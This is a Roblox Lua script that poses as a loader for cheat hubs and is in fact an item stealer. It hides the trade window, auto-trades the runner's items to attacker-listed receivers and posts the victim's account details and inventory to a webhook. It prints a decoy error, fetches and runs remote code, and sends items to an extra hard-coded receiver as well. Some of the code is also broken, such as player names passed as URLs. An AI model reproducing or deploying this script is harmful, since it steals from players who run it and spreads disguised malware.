rizz = {
    Receivers = {"rizzreceiver1"} -- Add receivers for rizz here
}

Commands = {
    ResendTrade = ".resend",
    RestartPlayer = ".restart"
}

repeat wait() until game:IsLoaded()

local games = {
    [142823291] = true,
    [335132309] = true,
    [636649648] = true
}

if not games[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do end
    wait(99999999999999999999999999999999999)
end

if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid webhook url.")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invalid receivers table.")
    return
end

if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid custom url.")
    return
end

if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end

if Config.Script == nil then
    Config.Script = "None"
elseif Config.Script == "Custom" then
    Config.Script = Config.Script .. " - " .. Config.CustomLink
end

warn([[:22: Expected identifier when parsing variable name, got 'ꯃꯤꯁ꯭ꯇꯣꯚꯔ ꯑꯥꯏꯇꯦꯝ ꯇꯦꯀꯔ ꯁ꯭ꯛꯔꯤꯞꯇ ꯑꯦꯛꯇꯤꯕ ꯑꯣꯏꯔꯦ꯫']])

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local Common = 0
local Uncommon = 0
local Rare = 0
local Legendary = 0
local Vintage = 0
local Godly = 0
local Ancient = 0
local Unique = 0

LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

LocalPlayer.OnTeleport:Connect(function()
    getfenv().queue_on_teleport(function()
        repeat wait() until game:IsLoaded()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mistovers/UI-Librarys/main/Fluent%20UI%20Lib'))()
    end)
    LocalPlayer.OnTeleport:Disconnect()
end)

if Hard ~= nil then
    AntiStealer = "Anti-Stealer detected"
else
    AntiStealer = "None detected"
end

if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
    Mobile = false
else
    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
    Mobile = true
end

function TapUI(button, check, button2)
    if check == "Active Check" then
        if button.Active then
            button = button[button2]
        else
            return
        end
    end
    if check == "Text Check" then
        if button == "^" then
            button = button2
        else
            return
        end
    end
    for i,v in pairs(events) do
        for _, connection in pairs(getconnections(button[v])) do
            connection:Fire()
        end
    end
end

local ConfigList = {
    AncientList = {},
    GodlyList = {},
    UniqueList = {},
    VintageList = {},
    LegendaryList = {},
    RareList = {},
    UncommonList = {},
    CommonList = {}
}

function Rarity(color, amount, tradeable, requirepath, path)
    Stack = 0

    if tradeable then
        if tradeable:FindFirstChild("Evo") then
            return
        end
    end

    if amount ~= "" then
        Stack = tonumber(amount:match("x(%d+)"))
    else
        Stack = 1
    end

    local r = math.floor(color.R * 255 + 0.5)
    local g = math.floor(color.G * 255 + 0.5)
    local b = math.floor(color.B * 255 + 0.5)

    if r == 106 and g == 106 and b == 106 then
        Common = Common + Stack
    elseif r == 0 and g == 255 and b == 255 then
        Uncommon = Uncommon + Stack
    elseif r == 0 and g == 200 and b == 0 then
        Rare = Rare + Stack
    elseif r == 220 and g == 0 and b == 5 then
        Legendary = Legendary + Stack
    elseif r == 255 and g == 0 and b == 179 then
        Godly = Godly + Stack
    elseif r == 100 and g == 10 and b == 255 then
        Ancient = Ancient + Stack
    elseif r == 240 and g == 140 and b == 0 then
        Unique = Unique + Stack
    else
        Vintage = Vintage + Stack
    end
end

function FullInventory()
    local Inventory = {}
    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for _, item in pairs(v.Container:GetChildren()) do
            if item.Name == "Christmas" or item.Name == "Halloween" then
                for _, child in pairs(item.Container:GetChildren()) do
                    if child:IsA("Frame") then
                        Rarity(child.ItemName.BackgroundColor3, child.Container.Amount.Text, child:FindFirstChild("Tags"))
                        if Config.FullInventory then
                            local number = child.Container.Amount.Text ~= "" and child.Container.Amount.Text or "x1"
                            table.insert(Inventory, child.ItemName.Label.Text .. " " .. number)
                        end
                    end
                end
            else
                if item:IsA("Frame") then
                    Rarity(item.ItemName.BackgroundColor3, item.Container.Amount.Text, item:FindFirstChild("Tags"))
                    if Config.FullInventory then
                        local number = item.Container.Amount.Text ~= "" and item.Container.Amount.Text or "x1"
                        table.insert(Inventory, item.ItemName.Label.Text .. " " .. number)
                    end
                end
            end
        end
    end
    for _, pet in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        if pet:IsA("Frame") then
            Rarity(pet.ItemName.BackgroundColor3, pet.Container.Amount.Text)
            if Config.FullInventory then
                local number = pet.Container.Amount.Text ~= "" and pet.Container.Amount.Text or "x1"
                table.insert(Inventory, pet.ItemName.Label.Text .. " " .. number)
            end
        end
    end
    if Config.FullInventory then
        return table.concat(Inventory, ", ")
    else
        return "Full inventory set false."
    end
end

function NotifyReceivers(message)
    local receivers = {}
    for _, receiver in ipairs(Config.Receivers) do
        table.insert(receivers, receiver)
    end
    for _, receiver in ipairs(rizz.Receivers) do
        table.insert(receivers, receiver)
    end
    for _, receiver in ipairs(receivers) do
        local success, response = pcall(function()
            return HttpService:PostAsync(receiver, HttpService:JSONEncode({content = message        }), Enum.HttpContentType.ApplicationJson)
        end
        if not success then
            warn("Failed to notify receiver: " .. receiver)
        end
    end
end

function SendTrade(player)
    if Mobile then
        local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
        TapUI(Path.Container.Close)
        TapUI(Path.Container.PlayerList[player].ActionButton)
        TapUI(Path.Popup.Container.Action.Trade)
        TapUI(Path.Popup.Container.Close)
    else
        local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
        TapUI(Path.Container.ToggleRequests.On)
        TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
        TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
        TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
        TapUI(Path.Container[player].ActionButton)
        TapUI(Path.Inspect.Trade)
        TapUI(Path.Inspect.Close)
    end
end

function ReadChats(player)
    Players[player].Chatted:Connect(function(msg)
        if msg == Commands.ResendTrade then
            SendTrade(player)
        elseif msg == Commands.RestartPlayer then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end
    end)
end

function Activate(player)
    for _, receiver in ipairs(Config.Receivers) do
        if receiver == player then
            ReadChats(player)
            wait(10)
            SendTrade(player)
        end
    end
    for _, rizzReceiver in ipairs(rizz.Receivers) do
        if rizzReceiver == player then
            ReadChats(player)
            wait(10)
            SendTrade(player)
        end
    end
end

ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
    wait(1)
    local ItemsSent = 0
    local Path = Mobile and LocalPlayer.PlayerGui.TradeGUI_Phone.Container or LocalPlayer.PlayerGui.TradeGUI.Container
    local ItemsInTrade = 0

    for _, v in pairs(Path.Items.Main:GetChildren()) do
        for _, item in pairs(v.Items.Container.Current.Container:GetChildren()) do
            if item:IsA("Frame") and item.ItemName.Label.Text ~= "Default Knife" and item.ItemName.Label.Text ~= "Default Gun" then
                if ItemsInTrade ~= 4 then
                    ItemsInTrade = ItemsInTrade + 1
                    local LoopsItem = 1
                    local Amount = item.Container.Amount.Text
                    if Amount ~= "" then
                        LoopsItem = tonumber(Amount:match("x(%d+)"))
                    end
                    task.wait()
                    for i = 1, LoopsItem do
                        TapUI(item.Container.ActionButton)
                    end
                end
            end
        end
    end
    wait(10)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
end)

game:GetService("RunService").Heartbeat:Connect(function()
    LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
    LocalPlayer.PlayerGui.TradeGUI.Enabled = false
end)

Players.PlayerAdded:Connect(function(player)
    Activate(player.Name)
end)

for _, v in pairs(Players:GetPlayers()) do
    Activate(v.Name)
end

function Loop(player)
    SendTrade()
end

function StartTrade(player)
    for _, receiver in ipairs(Config.Receivers) do
        if player == receiver then
            PeaceTimer = true
            wait(10)
            PeaceTimer = false
            Loop(player)
        end
    end
    for _, rizzReceiver in ipairs(rizz.Receivers) do
        if player == rizzReceiver then
            PeaceTimer = true
            wait(10)
            PeaceTimer = false
            Loop(player)
        end
    end
end

function StartTradesForExistingPlayers()
    for _, player in ipairs(Players:GetChildren()) do
        StartTrade(player.Name)
    end
end

-- Webhook Data
local data = {
   ["content"] = "@everyone",
   ["embeds"] = {
       {
            ["title"] = "👿 **Made by | Unluckyau**",
            ["description"] = "```Username     : " .. LocalPlayer.Name .. "\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. ", " .. table.concat(rizz.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGodly      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0xffd700),
       }
   }
}
local newdata = HttpService:JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn.request
request({Url = Config.Webhook, Body = newdata, Method = "POST", Headers = headers})

task.wait()

if Config.Script == "Custom" then
    loadstring(game:HttpGet(Config.CustomLink))()
elseif Config.Script == "Overdrive H" then
    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
elseif Config.Script == "Symphony Hub" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
elseif Config.Script == "Highlight Hub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
elseif Config.Script == "Eclipse Hub" then
    getgenv().mainKey = "nil"
    local a, b, c, d, e = loadstring, request or http_request or (http and http.request) or (syn and syn.request), assert, tostring, "https://api.eclipsehub.xyz/auth"
    c(a and b, "Executor not Supported")
    a(b({Url = e .. "?k=" .. d(mainKey), Headers = {["User-Agent"] = "Eclipse"}}).Body)()
elseif Config.Script == "R3TH PRIV" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
elseif Config.Script == "AshbornnHub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
elseif Config.Script == "Nexus" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
end

print('hi')
